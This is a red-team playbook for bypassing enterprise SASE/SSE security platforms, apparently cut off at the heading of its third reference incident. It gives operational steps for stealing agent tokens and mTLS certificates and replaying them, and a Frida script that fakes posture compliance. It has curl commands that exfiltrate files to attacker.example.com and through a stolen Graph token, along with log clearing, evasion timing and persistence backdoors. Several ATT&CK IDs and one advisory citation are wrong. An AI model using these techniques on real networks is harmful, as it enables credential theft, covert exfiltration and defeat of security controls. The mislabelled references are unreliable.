# SASE / SSE Attack Playbook

> End-to-end red team playbook for SASE / SSE platform compromise.
>
> **Scope**: Authorized engagements against Zscaler (ZIA / ZPA / ZDX), Netskope (Security Cloud), Palo Alto Prisma Access, Cisco Umbrella, CATO Networks, Cloudflare One, and Microsoft Entra Global Secure Access.
>
> **Audience**: Red team operators and pentesters with prior experience in network attacks (`network-pentest`, `network-sniffing-mitm`), cloud identity (`cloud-identity-attack`), and tunneling (`network-tunneling-proxy`).
>
> **Companion files**: `../SKILL.md` (skill definition), `../payloads.md` (command catalogue), `../test-cases.md` (12 structured test cases).

---

## Table of Contents

1. [Engagement Lifecycle](#1-engagement-lifecycle)
2. [Phase 1: Engagement Setup & Lab](#2-phase-1-engagement-setup--lab)
3. [Phase 2: Identify the SSE Vendor](#3-phase-2-identify-the-sse-vendor)
4. [Phase 3: Enumerate the Client Connector](#4-phase-3-enumerate-the-client-connector)
5. [Phase 4: Reverse Engineer the Bypass](#5-phase-4-reverse-engineer-the-bypass)
6. [Phase 5: Exfiltrate Through or Around the SSE](#6-phase-5-exfiltrate-through-or-around-the-sse)
7. [Phase 6: Evade SSL Inspection](#7-phase-6-evade-ssl-inspection)
8. [Phase 7: Detection Avoidance](#8-phase-7-detection-avoidance)
9. [Phase 8: Reporting & Defender Hand-off](#9-phase-8-reporting--defender-hand-off)
10. [MITRE ATT&CK Mapping](#10-mitre-attck-mapping)
11. [Vendor Decision Tree](#11-vendor-decision-tree)
12. [Lab Setup Cookbook](#12-lab-setup-cookbook)
13. [Report Template](#13-report-template)
14. [Appendix A: Reference Incidents](#appendix-a-reference-incidents)

---

## 1. Engagement Lifecycle

A typical SASE/SSE red team engagement moves through eight phases. The first four are reconnaissance and exploit development; the last four are execution and reporting.

```
Phase 1            Phase 2            Phase 3            Phase 4
Scope & Lab    →   Identify SSE   →   Enumerate       →   Reverse
Setup               Vendor              Client Connector    Engineer Bypass
                                                          ⚠ All authorized lab
   │                   │                   │                   │
   ▼                   ▼                   ▼                   ▼
 Engagement      macOS/Linux/         Zscaler / Netskope    Frida hooks,
 letter, lab     Windows process      / Palo Alto / Cisco   cache extraction,
 tenants for     scan, root cert      / CATO / Cloudflare   mTLS cert theft,
 each vendor     inspection, DNS      / GSA cache paths     binary disassembly
                 patterns
                                                          │
                                                          ▼
Phase 5            Phase 6            Phase 7            Phase 8
Exfiltrate     →   Evade SSL       →   Detection         →   Reporting &
Through/Around      Inspection          Avoidance             Defender Hand-off
   │                   │                   │                   │
   ▼                   ▼                   ▼                   ▼
 V2Ray /         ECH, DoH,           Log hygiene,           Engagement report,
 Shadowsocks,    pinning,            Frida anti-detect,     defender detection
 Trojan to       QUIC, re-encrypt    persistence            rules, remediation
 residential IP  inside TLS                                  guidance
```

**Engagement duration**: A focused SSE engagement is 2-4 weeks. Recon (Phases 1-3) takes 3-5 days. Bypass development (Phase 4) takes 5-10 days depending on the vendor. Execution (Phases 5-7) takes 3-7 days. Reporting (Phase 8) takes 3-5 days.

**Team composition**: 1-2 operators with prior SSE / cloud identity / mobile code signing experience. A reverse engineer for binary disassembly (Phase 4). A defender liaison for Phase 8.

---

## 2. Phase 1: Engagement Setup & Lab

### 2.1 Engagement Letter Essentials

Before any active testing, the engagement letter must explicitly cover:

- **Scope**: Which SSE vendor(s) (Zscaler, Netskope, Palo Alto, Cisco, CATO, Cloudflare, Microsoft GSA). The tenant name(s). The admin portal URL(s).
- **Test tenant vs production**: Active exploitation must occur in a test tenant (Zscaler Beta, Netskope Sandbox, M365 Developer) unless the engagement letter explicitly authorizes production testing with detection-evasion.
- **Endpoint scope**: Whose device (corporate managed, BYOD, attacker-controlled lab device). The endpoint OS (macOS, Windows, Linux).
- **Identity scope**: Whose credentials (test user, real user with consent, anonymous unauthenticated).
- **Detection-evasion scope**: Whether EDR alerts (CrowdStrike, Defender for Endpoint) are in scope. Whether anonymizer infrastructure (V2Ray, Trojan) is permitted.
- **Data exfiltration scope**: Whether data must be test data only, or whether the demonstration uses synthetic C2 traffic.
- **Admin API scope**: Whether the engagement includes the admin API (Zscaler ZIA Admin, Netskope Admin, Prisma Access Admin, Umbrella Admin, CATO Admin, Cloudflare Access Admin, Microsoft Graph GSA).
- **Stop conditions**: What triggers engagement termination (e.g., agent integrity alert, defender detection, user complaint).

### 2.2 Lab Tenant Acquisition

For each vendor in scope, obtain a lab tenant. See `payloads.md` Appendix C for the full list.

```bash
# Zscaler: trial at zscaler.com/free-trials (30 days)
# Request Zscaler Beta access via your SE for development tenants

# Netskope: trial via your SE; alternatively Netskope Cloud Exchange (free) for lab

# Palo Alto Prisma Access: trial via SE; alternatively set up a single-remote-network lab

# Cisco Umbrella: trial at signup.umbrella.com (14 days)

# CATO Networks: PoC via SE (30 days)

# Cloudflare One: free tier in any Cloudflare account (50 users free)

# Microsoft Entra GSA: M365 Developer Program tenant (free, 90 days renewable)
# Sign up at developer.microsoft.com/microsoft-365-dev-program
```

### 2.3 Lab Device Setup

The lab device should mirror the engagement target OS.

**macOS lab setup**:

```bash
# Disable SIP (recovery mode required)
# Reboot into Recovery (Cmd+R on Intel, hold power on Apple Silicon)
# Utilities > Terminal:
csrutil disable
# Reboot

# Install tooling
brew install --cask firefox
brew install --cask charles  # HTTPS proxy
brew install --cask proxyman  # alternative HTTPS proxy
brew install frida  # dynamic instrumentation
brew install mitmproxy  # HTTPS interception
brew install wireshark  # packet capture
brew install dnscrypt-proxy stubby  # DoH/DoT
brew install tor obfs4proxy  # Tor with obfs4 bridges
brew install --cask hopper  # disassembler (paid; free with delay)
brew install ghidra  # alternative disassembler (free)

# Install Python tooling
pip3 install ja3 ja4 tls-client frida-tools

# Install vendor clients (one or more)
brew install --cask zscaler-client-connector
brew install --cask netskope-client
brew install --cask globalprotect
brew install --cask cisco-secure-client
brew install --cask cloudflare-warp
```

**Linux lab setup** (Kali or Ubuntu):

```bash
sudo apt update
sudo apt install -y wireshark tshark mitmproxy tor obfs4proxy \
  frida-tools python3-pip openssl curl jq

# For SSE vendor clients, install via the vendor's Linux installer
# (Zscaler Client Connector for Linux, Netskope Client for Linux, etc.)
# Most vendors provide a .deb or .rpm

# Install V2Ray (Xray)
bash -c "$(curl -L https://github.com/XTLS/Xray-install/raw/main/install-release.sh)" @ install

# Install Shadowsocks
sudo apt install -y shadowsocks-libev

# Install Trojan
sudo apt install -y trojan
```

**Windows lab setup** (VM or physical):

```powershell
# Install tooling via winget
winget install --id WiresharkFoundation.Wireshark
winget install --id mitmproxy.mitmproxy
winget install --id Python.Python.3.12
winget install --id Microsoft.VisualStudio.2022.Community  # for Frida C# bindings if needed

# Install Frida via pip
pip install frida-tools

# Install vendor clients
winget install --id Cloudflare.WARP
winget install --id PaloAltoNetworks.GlobalProtect
# Zscaler, Netskope, Cisco Secure Client, GSA via vendor MSI installers
```

### 2.4 Lab Network Isolation

The lab must be isolated from production:

```bash
# Use a dedicated VLAN or virtual network (VMware/VirtualBox/UTM)
# Outbound traffic from the lab should route via:
#   - A residential IP VPS (for V2Ray/Trojan deployment)
#   - The lab SSE tenant (NOT production)

# Verify isolation
curl -s https://ifconfig.me/json  # should NOT match production egress

# On macOS, use multiple network locations:
sudo networksetup -createlocation "SSE Lab" populated
sudo networksetup -switchtolocation "SSE Lab"
```

---

## 3. Phase 2: Identify the SSE Vendor

On the engagement target endpoint (or BYOD device), identify which SSE vendor is deployed. Use multiple cross-correlated signals.

### 3.1 Signal Collection (Five Dimensions)

For each endpoint, collect:

1. **System trust store** — search for vendor root cert (Zscaler / Netskope / Palo Alto / Cisco / CATO / Cloudflare / Microsoft)
2. **Running processes** — `ps` / `Get-Process` for vendor agent names
3. **Network interfaces** — TUN/utun interfaces created by the agent
4. **DNS resolver** — which upstream DNS the system uses
5. **HTTPS interception issuer** — fetch any HTTPS site and inspect the cert issuer

See `payloads.md` §1 for the full command catalogue.

### 3.2 Multi-Vendor Deployments

Some enterprises deploy multiple SSE vendors (e.g., Zscaler for ZIA + Netskope for CASB). For each detected vendor, treat as a separate engagement track.

### 3.3 Hidden SSE (Network Edge Deployment)

If no agent is detected on the endpoint but DNS resolves to a corporate DNS and HTTPS shows SSE interception, the SSE is deployed at the network edge (site-to-site SSE). This is less common but occurs in branch-only deployments. In this case, the bypass techniques are network-layer (V2Ray, DoH) rather than agent-layer.

### 3.4 Documentation

Record in the engagement log:

```
[Phase 2] Vendor identification:
  Primary: Zscaler ZIA (gateway.zscalerbeta.net)
  Secondary: Zscaler ZPA (config.private.zscaler.com)
  Agent: ZscalerClientConnector 3.9.x on macOS 14.5
  Root cert: Zscaler Root CA (SHA-256 fingerprint: ...)
  Egress: 165.225.x.x (Zscaler cloud)
  DNS: 10.0.0.x (corporate resolver)
  Posture policy: domain_join + EDR + disk_encryption
```

---

## 4. Phase 3: Enumerate the Client Connector

For each detected vendor, enumerate the agent's local state, configuration, and credential caches.

### 4.1 Cache File Inventory

For each vendor, locate the cache directories and key files:

- **Zscaler**: `~/Library/Application Support/Zscaler/ZscalerClientConnector/` (macOS)
- **Netskope**: `/Library/Application Support/Netskope/STAgentUI/` (macOS)
- **Palo Alto**: `/Library/Preferences/com.paloaltonetworks.GlobalProtect.settings.plist` (macOS)
- **Cisco Umbrella**: `/Library/Application Support/OpenDNS Roaming Client/` (macOS)
- **CATO**: `/etc/cato/` (Linux socket)
- **Cloudflare WARP**: `/Library/Application Support/Cloudflare/` (macOS)
- **Microsoft GSA**: `%PROGRAMFILES%\Microsoft\Entra\Global Secure Access Client\` (Windows)

See `payloads.md` §3-§10 for the per-vendor enumeration commands.

### 4.2 Token / Ticket / mTLS Cert Extraction

For each vendor, extract the authentication credential:

- **Zscaler ZIA**: `obkey` (Zscaler Ticket, base64-encoded JWT-like)
- **Zscaler ZPA**: `/opt/zscaler/app_connector.crt` + `provisioning.key`
- **Netskope**: `nspa.xml` posture state + auth cookies
- **Palo Alto GlobalProtect**: `com.paloaltonetworks.GlobalProtect.settings.plist` portal + user
- **Cisco Umbrella**: `profiles/default.profile` (resolvers, org info)
- **Cloudflare WARP**: `mdm-deploy.json` + WARP token
- **Cloudflare Access**: Service tokens (CF-Access-Client-Id + Secret)
- **Cloudflare Tunnel**: `~/.cloudflared/<tunnel-uuid>.json` (AccountTag, TunnelID, TunnelSecret)
- **Microsoft GSA**: Trusts the Entra ID PRT (cross-ref `cloud-identity-attack`)

### 4.3 IPC Surface Discovery

Locate the agent's IPC interfaces:

- **macOS**: Unix domain sockets in `/tmp/`, `/var/tmp/`, `~/Library/Group Containers/`
- **Windows**: Named pipes, localhost TCP
- **Linux**: Unix domain sockets in `/tmp/`, `/run/`

Use `lsof -U` (macOS/Linux) or `Get-ChildItem \\.\pipe\` (Windows) to enumerate.

Test each IPC interface for unauthenticated access (some agents accept commands without verifying the caller's identity).

### 4.4 Network Egress Mapping

Identify the SSE cloud endpoints the agent talks to:

```bash
# Capture the agent's traffic for 60 seconds
sudo tshark -i en0 -w /tmp/agent-traffic.pcap -a duration:60
# After capture, identify unique SNIs:
tshark -r /tmp/agent-traffic.pcap -Y 'tls.handshake.extensions_server_name' \
  -T fields -e tls.handshake.extensions_server_name | sort -u
```

Record the unique endpoints for each vendor. These are the SSE cloud IPs/domains used later for replay testing.

---

## 5. Phase 4: Reverse Engineer the Bypass

With the agent's state and credential caches enumerated, develop the bypass technique. The bypass class depends on the goal:

| Goal | Bypass Class |
|------|--------------|
| Hide a specific flow from the SWG | TLS inspection bypass (ECH, DoH, pinning) |
| Bypass posture to access privileged internal apps | Posture spoof (Frida hook, file edit) |
| Exfiltrate data without triggering DLP | Anonymizer proxy (V2Ray, Trojan) |
| Maintain access after agent restart | Persistence via stolen token / cert |
| Route to internal apps from outside | App Connector cert replay |

### 5.1 Posture Spoof (Frida Workflow)

For agents that report posture from local state, the bypass is a Frida hook on the posture reporter.

```bash
# 1. Discover posture functions
frida-trace -i '*[Pp]osture*' -n ZscalerClientConnector

# 2. Verify the function's role
# (Use Hopper or Ghidra to disassemble; confirm the function name)

# 3. Write a Frida hook (see payloads.md Appendix D.1)
cat > /tmp/bypass-posture.js << 'EOF'
const postureFunc = Module.getGlobalExportByName( '_ZN20ZscalerClientConnector13getPostureEv');
if (postureFunc) {
  Interceptor.replace(postureFunc, new NativeCallback(() => {
    console.log('[+] Posture hook fired');
    return 1;  // compliant
  }, 'int', []));
}
EOF

# 4. Spawn the agent with Frida
frida -f /Applications/Zscaler/ZscalerClientConnector.app/Contents/MacOS/ZscalerClientConnector \
  -l /tmp/bypass-posture.js --no-pause

# 5. Trigger posture re-evaluation (sign out / sign in)

# 6. Verify: from a non-compliant state, access a posture-gated app
#    (e.g., disable disk encryption, try to access an internal app via ZPA)
```

### 5.2 TLS Inspection Bypass (ECH + DoH Workflow)

For domain-based policy, the bypass is ECH + DoH.

```bash
# 1. Configure Firefox for ECH + DoH (see payloads.md §5)
# 2. Restart Firefox, verify ECH at tls-ech.dev
# 3. Visit a domain in a blocked category
# 4. If bypass succeeds, document
# 5. If the SSE blocks ECH (some 2024+ deployments), fall back to anonymizer (Phase 5)
```

### 5.3 Token Replay (Identity-Based Bypass)

For agents that trust an IdP-issued token, the bypass is token replay from another device.

```bash
# 1. Extract the token from the agent's cache (Phase 3)
# 2. Decode and inspect the token (TTL, scope, audience)
# 3. Replay the token from an attacker-controlled host:
#    - For Zscaler ZIA: replay the obkey at the ZIA auth endpoint
#    - For Microsoft GSA: replay the Entra ID PRT through a non-managed device
#    - For Cloudflare Access: replay the service token
#    - For Okta-federated SSE: replay the Okta sid cookie
```

### 5.4 mTLS Cert Replay (App Connector Compromise)

For agents that authenticate via mTLS cert (ZPA App Connectors, Netskope Publishers, Cloudflare Tunnels), the bypass is cert replay.

```bash
# 1. Locate the mTLS cert + key on the compromised host (Phase 3)
# 2. Copy to the attacker host
# 3. Use the cert to authenticate to the SSE cloud API
# 4. Enumerate the published apps / segment groups
# 5. Route through the stolen connector to internal apps
```

### 5.5 Split-Tunnel Race Condition

For agents with split-tunneling, the bypass is winning the classification race at agent startup.

```bash
# 1. Stop the agent daemon
# 2. Open a long-lived connection to the target
# 3. Restart the agent
# 4. Verify the connection persists (the socket was classified before the agent's filter installed)
# 5. If the race fails, try the LD_PRELOAD hook approach (Linux only)
```

### 5.6 Anti-Frida Bypass

Modern agents (Zscaler, Netskope, 2024+) ship with anti-Frida. The bypass depends on the agent's check:

- **PTrace check**: hook `ptrace()` and return 0
- **/proc/self/maps scan for frida-agent**: hook `open()` and redirect
- **Frida RPC pipe detection**: hook `connect()` and block
- **Code signing check on loaded libraries**: hook `dlopen()` and patch

See `payloads.md` Appendix D.4 for sample anti-Frida hooks.

---

## 6. Phase 5: Exfiltrate Through or Around the SSE

With the bypass developed, demonstrate data exfiltration. Two paths:

### 6.1 Through the SSE (Using a Trusted Destination)

```bash
# Exfiltrate data inside an HTTPS flow to a SaaS the SWG trusts
# (e.g., OneDrive, Google Drive, Dropbox)

# 1. Wrap the data in a file with a benign name
echo "SENSITIVE_DATA_EXAMPLE" > /tmp/Q4_financial_summary.xlsx

# 2. Upload to a corporate-trusted SaaS
# (e.g., OneDrive via Microsoft Graph)
curl -X PUT -H "Authorization: Bearer $MSGRAPH_TOKEN" \
  -H "Content-Type: application/octet-stream" \
  --data-binary @/tmp/Q4_financial_summary.xlsx \
  "https://graph.microsoft.com/v1.0/me/drive/root:/Q4_financial_summary.xlsx:/content"

# 3. The SWG sees: HTTPS to graph.microsoft.com — trusted destination
# 4. The file is now in the attacker's OneDrive (accessed via a stolen MSGraph token)
# 5. SWG DLP may catch this — tune the demonstration to use test data only
```

### 6.2 Around the SSE (Using an Anonymizer)

```bash
# Exfiltrate via a V2Ray (vmess + WS + TLS) connection to a residential IP
# (see payloads.md §11 for full server + client config)

# 1. Set up V2Ray server on a residential IP VPS
# 2. Configure V2Ray client locally (socks proxy at 127.0.0.1:1080)
# 3. Exfiltrate through the local socks proxy:
curl --socks5 127.0.0.1:1080 \
  --upload-file /tmp/Q4_financial_summary.xlsx \
  https://attacker.example.com/upload

# 4. The SWG sees: HTTPS to attacker.example.com (which has a valid cert and
#    serves a benign-looking website on the front)
# 5. SWG classification: "uncategorized" or "low-risk" if the domain is fresh
# 6. Exfiltration succeeds
```

### 6.3 Hybrid (DoH + Anonymizer)

```bash
# Combine DoH (to bypass DNS policy) with V2Ray (to bypass SWG classification)
# 1. Firefox DoH to a non-corporate resolver
# 2. V2Ray client wraps traffic in TLS to a residential IP
# 3. The flow is indistinguishable from legitimate HTTPS to that residential domain
```

---

## 7. Phase 6: Evade SSL Inspection

If the bypass target is the SSE's TLS inspection (not policy), use one or more of:

### 7.1 Encrypted Client Hello (ECH)

- **Coverage**: All major browsers (Firefox, Chromium) support ECH
- **Effectiveness**: Strong against domain-based policy; weak against IP-based
- **Detection**: SSE may block ECH at the network edge

### 7.2 DoH / DoT

- **Coverage**: Firefox, Chromium, dnscrypt-proxy, stubby
- **Effectiveness**: Strong against DNS-based policy; weak against SWG that classifies by SNI
- **Detection**: SSE may block DoH to outside resolvers (cloudflare-dns.com, dns.google)

### 7.3 TLS Pinning (Application-Layer)

- **Coverage**: Apps that pin (most mobile apps, some desktop apps)
- **Effectiveness**: Per-app; the SSE typically bypasses pinned apps
- **Detection**: SSE logs the bypass

### 7.4 HTTP/3 (QUIC)

- **Coverage**: curl with `--http3`, Chrome with QUIC enabled
- **Effectiveness**: Some SWGs do not inspect UDP/443
- **Detection**: SSE may block QUIC entirely

### 7.5 Re-encrypt Inside the inspected Flow

- **Coverage**: Custom protocols (Shadowsocks-over-TLS, V2Ray-over-WS-over-TLS)
- **Effectiveness**: Strong — the SWG sees a "trusted" destination but the payload is encrypted again
- **Detection**: DLP on the decrypted flow may detect proxy signatures

### 7.6 Anonymizer Deployment

- **Coverage**: V2Ray (vmess/vless + WS + TLS, or Reality), Trojan, Obfs4
- **Effectiveness**: Strong against SWG classification
- **Detection**: SSE may block known anonymizer infrastructure

---

## 8. Phase 7: Detection Avoidance

After demonstrating the bypass, clean up to avoid detection and document the detection gaps for the defender.

### 8.1 Pre-Engagement Detection-Evasion Plan

Before active testing, plan:

- **EDR alerts**: Will Frida injection trigger CrowdStrike / Defender for Endpoint? If so, the engagement scope must cover EDR evasion OR the defender must temporarily allow the alerts.
- **Agent integrity**: Modern agents report their integrity to the SSE cloud. Stopping the agent may trigger an alert.
- **Cloud-side logs**: Zscaler Nanolog, Netskope CCL, Cloudflare Gateway logs are not clearable from the endpoint. Assume all activity is logged.

### 8.2 In-Engagement Evasion Techniques

- **Time activity to overlap with legitimate user activity**: schedule bypass tests during business hours when the user's normal traffic masks the bypass.
- **Avoid agent service stop where possible**: prefer Frida hooks to outright service termination.
- **Use Frida anti-detection**: bypass the agent's PTrace/maps checks before injecting.
- **Avoid triggering DLP**: use test data, not real PII/source code.
- **Use CDN-fronted anonymizers**: V2Ray behind Cloudflare CDN is indistinguishable from legitimate Cloudflare traffic.

### 8.3 Post-Engagement Cleanup

See `payloads.md` §14 for the full cleanup command catalogue:

- Clear local agent logs (auditlog, heartbeats)
- Restore trust store (if root cert was removed)
- Restart stopped agents (or rely on MDM to redeploy)
- Document cloud-side logs that cannot be cleared (for defender review)

### 8.4 Persistence (If Engagement Includes Persistence)

- **Backdoor Zscaler Client Connector config**: modify the PAC config to prefer attacker-controlled upstream
- **Backdoor Netskope nspa.xml**: add a posture rule that always passes
- **Persistence via second agent profile**: deploy a second profile that routes through attacker infrastructure
- **Persistence via stolen token / cert**: the token / cert remains valid until rotated by the admin

---

## 9. Phase 8: Reporting & Defender Hand-off

The engagement report is the deliverable. Structure it for both the security team (technical detail) and the business (risk and remediation).

### 9.1 Report Structure

Use the template in §13. Key sections:

1. **Executive summary**: 1-page overview of findings, risk, and remediation priority.
2. **Engagement scope**: what was tested, what was not.
3. **Vendor identification**: which SSE vendor(s) deployed, agent versions, configuration.
4. **Findings**: each bypass class with severity, reproducibility, evidence.
5. **MITRE ATT&CK mapping**: which techniques were used.
6. **Remediation**: per-finding actionable fixes for the defender.
7. **Detection recommendations**: how the defender should detect this class of bypass in the future.
8. **Appendix**: full command catalogue, packet captures, Frida scripts.

### 9.2 Defender Hand-off

Schedule a readout with the defender that covers:

- **What was bypassed**: which SSE policy, which layer.
- **What was detected**: which bypass attempts were caught by the defender's existing tooling.
- **What was missed**: which bypass attempts went undetected.
- **Remediation priority**: which findings need immediate action vs. longer-term hardening.
- **Detection rule hand-off**: provide the KQL / SPL / Suricata rules from §14.4-14.10.

### 9.3 Post-Engagement Verification

After the defender implements remediations, verify in a follow-up:

- Re-run the test cases from `test-cases.md` that previously failed
- Confirm the remediation closes the bypass
- Document residual risk

---

## 10. MITRE ATT&CK Mapping

| Technique | ID | SSE Context |
|-----------|----|-------------|
| Adversary-in-the-Middle | T1557 | The SSE cloud performs MitM by design; bypass targets the SSE's MitM |
| Obfuscated Files or Information | T1027 | V2Ray / Trojan / Shadowsocks obfuscation defeats SWG classification |
| Valid Accounts | T1078 | Stolen SSO token replayed through SSE |
| Use Alternate Authentication Material | T1550 | OAuth token / Zscaler Ticket / mTLS cert replay |
| Protocol Tunneling | T1572 | Shadowsocks / V2Ray tunnels over SSE-inspected TLS |
| Encrypted Channel | T1573 | DoH / DoT / ECH to bypass DNS and SNI policy |
| Proxy | T1090 | Anonymizer proxies (V2Ray, Trojan) for traffic evasion |
| Standard Non-Application Layer Protocol | T095 | QUIC (HTTP/3) to bypass SWGs that inspect HTTP/2 |
| Modifying Authentication | T1606 | Forged SAML / OAuth assertions to authenticate to SSE (cross-ref cloud-identity-attack Golden SAML) |
| Debugger Evasion | T1622 | Anti-Frida bypass to evade agent's debugger detection |
| Impair Defenses | T1562 | Stopping / disabling the SSE agent service |
| OS Credential Dumping | T1003 | Extracting token caches from agent directories (analogous to LSASS) |
| Security Tool Evasion | T1027.005 | TLS fingerprint (JA3/JA4) spoofing against SWG classification |

---

## 11. Vendor Decision Tree

Given the detected vendor, choose the bypass strategy.

### 11.1 Zscaler (ZIA / ZPA / ZDX)

```
Detected: Zscaler
├── ZIA only (internet-bound)
│   ├── Bypass target: TLS inspection
│   │   ├── ECH + DoH (test first)
│   │   ├── V2Ray/Trojan to residential IP (fallback)
│   │   └── Split-tunnel race (ZIA-FWD-ZPA)
│   └── Bypass target: posture
│       └── Frida hook on ZscalerClientConnector (anti-Frida bypass required)
├── ZPA (internal apps)
│   ├── Bypass target: App Connector cert
│   │   └── Compromise internal host running App Connector → cert replay
│   └── Bypass target: posture
│       └── Frida hook or nspa-style config edit
└── ZDX (digital experience monitoring)
    └── Bypass target: agent reporting
        └── Frida hook on ZDX agent reporting
```

### 11.2 Netskope

```
Detected: Netskope
├── SWG (internet-bound)
│   ├── Bypass target: MACE classification
│   │   ├── JA3/JA4 spoof (curl-impersonate, tls-client)
│   │   ├── ECH + DoH
│   │   └── V2Ray/Trojan
│   └── Bypass target: app-specific routing
│       └── Identify apps that bypass classification (Steerable VPN)
├── CASB (SaaS)
│   └── Bypass target: API-based CASB
│       └── Stolen SaaS API token (cross-ref cloud-identity-attack)
└── Private Access
    └── Bypass target: Publisher cert
        └── Compromise internal host running Publisher → cert replay
```

### 11.3 Palo Alto Prisma Access

```
Detected: Palo Alto Prisma Access / GlobalProtect
├── Prisma Access (SWG + ZTNA)
│   ├── Bypass target: TLS inspection
│   │   ├── ECH + DoH
│   │   └── V2Ray/Trojan
│   └── Bypass target: agent (GlobalProtect)
│       ├── CVE-2024-3400 if PAN-OS in scope
│       └── Agent auth bypass
└── Service Infrastructure
    └── Bypass target: mTLS cert
        └── Compromise internal host → cert replay
```

### 11.4 Cisco Umbrella

```
Detected: Cisco Umbrella
├── DNS-based policy
│   ├── DoH to outside resolver
│   ├── DoT to outside resolver
│   └── SmartProxy block-page bypass (direct IP)
├── Roaming client
│   ├── Agent stop (macOS/Linux)
│   └── Profile tampering
└── SIG (Secure Internet Gateway)
    └── Profile manipulation
```

### 11.5 CATO Networks

```
Detected: CATO Networks
├── SASE Socket (hardware/virtual)
│   ├── Socket takeover (extract tunnel PSK + cert)
│   └── Isolated-traffic abuse (modify isolation_rules.json)
└── CATO Client (BYOD)
    └── Standard bypass patterns (ECH, DoH, V2Ray)
```

### 11.6 Cloudflare One

```
Detected: Cloudflare One
├── WARP
│   ├── Agent stop (BYOD)
│   └── Per-app bypass via local proxy
├── Gateway
│   └── DoH bypass
├── Access
│   ├── Stolen service token replay
│   └── JWT forgery (with stolen team private key)
└── Tunnel
    └── Stolen tunnel credentials replay
```

### 11.7 Microsoft Entra GSA

```
Detected: Microsoft Entra Global Secure Access
├── GSA client
│   ├── Agent stop
│   └── Traffic forwarding profile manipulation
├── Identity layer (Entra ID)
│   ├── Stolen PRT replay (Storm-0558 pattern)
│   └── Forged Entra ID token (if MSA signing key compromised)
└── Admin API
    └── Microsoft Graph GSA endpoints with stolen token
```

---

## 12. Lab Setup Cookbook

### 12.1 Simulated Zscaler Tenant

```bash
# Sign up for Zscaler Beta (free for development)
# Configure a test user with ZIA + ZPA

# On the lab device, install Zscaler Client Connector
brew install --cask zscaler-client-connector

# Enroll the device against the Beta tenant
# Use the enrollment URL from the admin portal

# Verify enrollment
sudo cat /Library/Application\ Support/Zscaler/Zscaler/.zscalerinfo
```

### 12.2 Simulated Netskope Tenant

```bash
# Sign up for Netskope trial via your SE
# Configure a test user with Security Cloud + Private Access

# On the lab device, install Netskope Client
# Use the enrollment URL from the admin portal
```

### 12.3 BYOD Device with Frida

```bash
# Lab macOS device with SIP disabled (for Frida on production-signed agents)
# 1. Reboot into Recovery (Cmd+R on Intel, hold power on Apple Silicon)
# 2. Utilities > Terminal:
csrutil disable
# 3. Reboot

# Install Frida
brew install frida
pip3 install frida-tools

# Verify Frida works
frida-ps -ai | head

# Disable code-signing enforcement for the target agent (if needed)
# (For authorized lab only; not for production)
sudo codesign --remove-signature /Applications/Zscaler/ZscalerClientConnector.app/Contents/MacOS/ZscalerClientConnector
```

### 12.4 Anonymizer Lab (V2Ray Server)

```bash
# Provision a VPS on a residential IP provider
# (e.g., a cable ISP VPS, or AWS/Azure/GCP with a residential-looking ASN)

# Install Xray
bash -c "$(curl -L https://github.com/XTLS/Xray-install/raw/main/install-release.sh)" @ install

# Generate a UUID
xray uuid

# Configure Xray with vmess + WS + TLS (see payloads.md §11.2)

# Issue a Let's Encrypt cert for the VPS domain
certbot certonly --nginx -d REPLACE_WITH_YOUR_DOMAIN
```

### 12.5 Lab Network Isolation

```bash
# Dedicate a VLAN for the lab
# Verify no production traffic enters or leaves

# On macOS, use a separate network location:
sudo networksetup -createlocation "SSE Lab" populated
sudo networksetup -switchtolocation "SSE Lab"

# Configure the lab location with the lab DNS / proxy
sudo networksetup -setdnsservers "SSE Lab" 10.0.0.x  # lab resolver

# Verify isolation
curl -s https://ifconfig.me/json  # should NOT match production egress
```

---

## 13. Report Template

```markdown
# [Client Name] — SASE / SSE Red Team Engagement Report

## Document Control

| Field | Value |
|-------|-------|
| Engagement ID | RED-2026-XXX |
| Engagement dates | YYYY-MM-DD to YYYY-MM-DD |
| Operators | [Operator 1], [Operator 2] |
| Reviewer | [Lead reviewer] |
| Classification | Confidential — Client Only |

## 1. Executive Summary

[1-page overview: what was tested, key findings, business risk, remediation priority.]

## 2. Engagement Scope

| Item | In Scope | Out of Scope |
|------|----------|--------------|
| SSE vendor(s) | Zscaler ZIA + ZPA | (none) |
| Tenant | Lab (Zscaler Beta) | Production |
| Endpoint OS | macOS 14.5 | Windows, Linux |
| Identity | Test user (corp-test-1) | Real users |
| Admin API | ZIA / ZPA Admin | (none) |
| Detection-evasion | EDR in scope | (none) |
| Anonymizer | Permitted (lab VPS) | Production anonymizer |

## 3. Vendor Identification

[Vendor, agent version, root cert fingerprint, egress IPs, posture policy.]

## 4. Findings

### Finding 1: [Title]
| Field | Value |
|------|-------|
| ID | F-001 |
| Severity | HIGH |
| Bypass class | TLS inspection (ECH) |
| Affected policy | Domain-based block list |
| Reproducibility | 5/5 attempts |
| Evidence | [pcap, screenshot, log] |
| Remediation | Enable ECH-block at ZIA edge; subscribe to ECH-aware SWG update |

[Continue for each finding.]

## 5. MITRE ATT&CK Mapping

[Table of techniques used; see §10.]

## 6. Remediation Summary

| Priority | Finding | Remediation | Owner | Due |
|----------|---------|-------------|-------|-----|
| P1 | F-001 | ECH-block | SSE admin | YYYY-MM-DD |
| P2 | F-002 | App Connector cert rotation | SSE admin | YYYY-MM-DD |
| ... | ... | ... | ... | ... |

## 7. Detection Recommendations

[KQL / SPL / Suricata rules for each bypass class; see payloads.md §14.]

## 8. Appendix

- Full command catalogue
- Packet captures (reference)
- Frida scripts
- Cloud-side log excerpts (with timestamps)
```

---

## Appendix A: Reference Incidents

### A.1 Storm-0558 (2023, China APT)

- **Reference**: Microsoft MSRC blog (Aug 2023), CISA AA23-144A
- **Summary**: Chinese APT forged Entra ID tokens using a stolen Microsoft Account (MSA) signing key. The forged tokens were used to read mail via Outlook Web Access and would have granted access to any Entra ID-trusting service, including Microsoft Entra Global Secure Access.
- **SSE Implication**: A stolen or forged Entra ID token is a credential through every SSE that trusts Entra ID (Zscaler, Netskope, Microsoft GSA, and others via SSO).
- **Lesson**: The IdP is the SSE's identity layer; IdP compromise is SSE compromise.

### A.2 SolarWinds SUNBURST (2020, Russian APT)

- **Reference**: CISA AA21-008A
- **Summary**: Russian APT compromised SolarWinds Orion and used Golden SAML (forged SAML assertions with the AD FS token-signing cert) to read mail at Treasury and DHS CISA.
- **SSE Implication**: SASE vendors that trust AD FS via SAML SSO inherit the AD FS trust anchor. AD FS cert compromise → forge SAML for any user → SSE accepts.
- **Lesson**: The federation trust is a long-lived secret. Rotate every 1-2 years, not 5-10.

### A.3 LAPSUS$ (2022)
